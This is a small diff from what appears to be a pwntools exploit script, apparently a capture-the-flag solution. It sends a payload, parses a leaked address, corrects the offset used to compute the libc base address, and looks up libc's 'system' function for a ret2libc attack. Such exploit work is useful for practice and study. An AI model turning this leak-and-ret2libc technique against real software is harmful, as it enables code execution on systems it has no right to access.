@@ -11,7 +11,7 @@ r.sendafter(b'name :', payload)
 r.recvuntil(b'a'*24)
 leak = u32(r.recv(4))
 log.info("leak address: " + hex(leak))
-libc.address = leak - 0x61 - 0x1b0000
+libc.address = leak - 0xc61
 log.info("libc base: " + hex(libc.address))
 
 system = libc.sym['system']
